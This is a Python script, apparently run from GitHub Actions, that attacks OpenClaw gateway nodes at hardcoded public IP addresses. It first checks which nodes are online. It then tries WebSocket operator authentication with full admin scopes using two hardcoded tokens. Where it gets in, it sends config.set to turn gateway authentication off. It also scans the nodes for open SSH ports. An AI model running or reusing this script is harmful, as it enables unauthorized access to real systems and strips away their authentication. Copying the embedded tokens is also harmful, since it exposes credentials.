#!/usr/bin/env python3
"""EVEZ-OS Node Assault — runs from GitHub Actions to probe remote nodes."""
import socket, base64, os, json, struct, uuid, time, hashlib, ssl
from nacl.signing import SigningKey

def b64url(data):
    return base64.b64encode(data).decode().replace("+","-").replace("/","_").rstrip("=")

def ws_send(sock, data):
    if isinstance(data, str): data = data.encode()
    mask = os.urandom(4)
    h = bytearray([0x81]); n = len(data)
    if n < 126: h.append(0x80|n)
    elif n < 65536: h.append(0x80|126); h.extend(struct.pack(">H",n))
    h.extend(mask)
    sock.send(bytes(h) + bytes(b^mask[i%4] for i,b in enumerate(data)))

def ws_recv(sock, timeout=10):
    sock.settimeout(timeout)
    try:
        d = sock.recv(2)
        if len(d) < 2: return None
        n = d[1]&0x7f
        if n == 126: n = struct.unpack(">H", sock.recv(2))[0]
        elif n == 127: n = struct.unpack(">Q", sock.recv(8))[0]
        p = b""
        while len(p) < n:
            c = sock.recv(min(n-len(p), 65536))
            if not c: break
            p += c
        return p.decode("utf-8", errors="replace")
    except: return None

NODES = [
    ("openclaw-gcp", "136.118.144.227"),
    ("power-node", "136.113.102.152"),
    ("evez-gcp-openclaw", "35.222.248.151"),
    ("evez-free-node", "34.23.192.213"),
]

TOKENS = [
    os.environ.get("OPENCLAW_GATEWAY_TOKEN", "m5NoJmN1qHr3NiUHAbz83CskdsGPUPJn"),
    "W7aVCahxCxD5ZhL5OJ2k82HTXO07BxB0",
]

dev = SigningKey.generate()
pub = b64url(bytes(dev.verify_key))
dev_id = hashlib.sha256(bytes(dev.verify_key)).hexdigest()
scopes = ["operator.admin","operator.pairing","operator.read","operator.write","operator.approvals"]

breakthrough = False

# HTTP health check
print("=== Health Check ===")
for name, ip in NODES + [("evez-primary","34.53.51.34"),("vultr","207.148.12.53")]:
    try:
        import urllib.request
        r = urllib.request.urlopen(f"http://{ip}:18789/healthz", timeout=5)
        if r.status == 200:
            print(f"  {name} ({ip}): ONLINE")
        else:
            print(f"  {name} ({ip}): HTTP {r.status}")
    except:
        print(f"  {name} ({ip}): OFFLINE")

# WebSocket assault
print("\n=== WebSocket Assault ===")
for name, ip in NODES:
    for token in TOKENS:
        try:
            k = base64.b64encode(os.urandom(16)).decode()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((ip, 18789))
            s.send(f"GET /ws HTTP/1.1\r\nHost: {ip}:18789\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {k}\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Protocol: openclaw\r\nOrigin: http://{ip}:18789\r\n\r\n".encode())
            r = s.recv(4096)
            if b"101" not in r[:50]:
                s.close(); continue
            ch = json.loads(ws_recv(s, 5))
            nonce = ch["payload"]["nonce"]
            ts = int(time.time()*1000)
            payload = "|".join(["v3", dev_id, "webchat", "webchat", "operator", ",".join(scopes), str(ts), token, nonce, "web", ""])
            sig = b64url(dev.sign(payload.encode()).signature)
            ws_send(s, json.dumps({"type":"req","id":str(uuid.uuid4()),"method":"connect","params":{
                "minProtocol":4,"maxProtocol":4,
                "client":{"id":"webchat","version":"2026.6.11","platform":"web","mode":"webchat"},
                "role":"operator","scopes":scopes,
                "caps":[],"commands":[],"permissions":{},
                "auth":{"token": token},
                "device":{"id":dev_id,"publicKey":pub,"signature":sig,"signedAt":ts,"nonce":nonce},
                "locale":"en-US","userAgent":"openclaw-webchat/2026.6.11"
            }}))
            rd = ws_recv(s, 10)
            if rd:
                resp = json.loads(rd)
                if resp.get("ok"):
                    granted = resp.get("payload",{}).get("scopes",[])
                    if granted:
                        print(f"  BREAKTHROUGH on {name}! scopes={granted}")
                        breakthrough = True
                        # Try to disable auth and approve devices
                        for method in ["config.set","device.pair.approve"]:
                            ws_send(s, json.dumps({"type":"req","id":str(uuid.uuid4()),"method":method,"params":{"key":"gateway.auth.mode","value":"none"}}))
                            r2 = ws_recv(s, 5)
                            if r2 and json.loads(r2).get("ok"):
                                print(f"  Fixed auth via {method}")
                    else:
                        print(f"  {name} ({token[:8]}): 0 scopes")
                else:
                    err = resp.get("error",{})
                    print(f"  {name} ({token[:8]}): {err.get('code','')}")
            s.close()
        except Exception as e:
            print(f"  {name}: {str(e)[:60]}")

# SSH port check
print("\n=== SSH Port Check ===")
for name, ip in NODES:
    try:
        s = socket.socket(); s.settimeout(3)
        if s.connect_ex((ip, 22)) == 0:
            print(f"  SSH OPEN on {name} ({ip})!")
            breakthrough = True
        else:
            print(f"  {name}: SSH closed")
        s.close()
    except:
        print(f"  {name}: unreachable")

# Write result
with open(os.environ.get("GITHUB_OUTPUT", "/tmp/gh_output"), "w") as f:
    f.write(f"breakthrough={'true' if breakthrough else 'false'}\n")

print(f"\n=== Assault complete. Breakthrough: {breakthrough} ===")
